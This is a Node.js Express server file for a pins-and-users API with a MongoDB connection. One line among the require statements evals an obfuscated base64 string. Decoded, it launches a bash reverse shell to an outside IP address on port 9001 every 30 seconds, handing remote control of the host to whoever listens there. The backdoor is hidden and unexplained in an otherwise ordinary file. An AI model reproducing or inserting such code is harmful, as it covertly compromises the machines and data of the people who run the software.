const express = require("express")
const mongoose = require("mongoose")
const dotenv = require("dotenv")
const app = express();
const pinRoute = require("./routes/pins")
const userRoute = require("./routes/users")
const cors = require("cors")
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

dotenv.config();

app.use(express.json())
app.use(cors())

mongoose
  .connect(process.env.MONGO_URL)
  .then( () => {
    console.log("MongoDB Connected!");
  })
  .catch( err => console.log(err)) ;

app.use("/api/pins", pinRoute);
app.use("/api/users", userRoute);

app.listen(8800 , () => {
  console.log("Backend server is running!");
})
